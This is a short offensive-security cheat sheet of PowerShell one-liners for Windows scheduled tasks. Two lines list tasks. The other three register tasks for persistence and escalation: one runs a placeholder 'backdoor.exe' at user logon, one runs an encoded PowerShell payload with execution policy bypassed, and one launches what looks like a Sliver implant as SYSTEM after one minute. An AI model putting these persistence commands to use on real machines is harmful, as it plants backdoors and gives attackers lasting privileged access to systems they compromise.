
# pwsh
% windows, scheduled tasks

#plateform/windows #target/local #cat/RECON/SCHEDULED-TASK #tag/powershell 

## scheduled tasks - find all  
```powershell
Get-ScheduledTask | select TaskName,State
```

## scheduled tasks - detal
```powershell
Get-ScheduledTask <task_name> |Export-ScheduledTask
```

## scheduled tasks - launch binary at user logon
```powershell
$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c  <binary_full_path|C:\windows\Temp\backdoor.exe>"; $T = New-ScheduledTaskTrigger -AtLogOn -User "<user|.\jubeaz>"; $P = New-ScheduledTaskPrincipal "<user|.\jubeaz>"; $S = New-ScheduledTaskSettingsSet; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask -Force -TaskName <task_name|jubeaz> -InputObject $D
```

## scheduled tasks - launch powhershell encoded at user logon
```powershell
$A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy bypass -e   <b64_payload>"; $T = New-ScheduledTaskTrigger -AtLogOn -User "<user|.\jubeaz>"; $P = New-ScheduledTaskPrincipal "<user|.\jubeaz>"; $S = New-ScheduledTaskSettingsSet; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask -Force -TaskName <task_name|jubeaz> -InputObject $D
```

## scheduled tasks - launch in 1 minute
```powershell
Unregister-ScheduledTask -TaskName "jubeaz-b_sliv" -Confirm:$false ;$A = New-ScheduledTaskAction -Execute "c:\windows\temp\b_sliv_fh.exe"; $T = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1); $P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest;$S = New-ScheduledTaskSettingsSet;$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask "jubeaz-b_sliv" -InputObject $D
```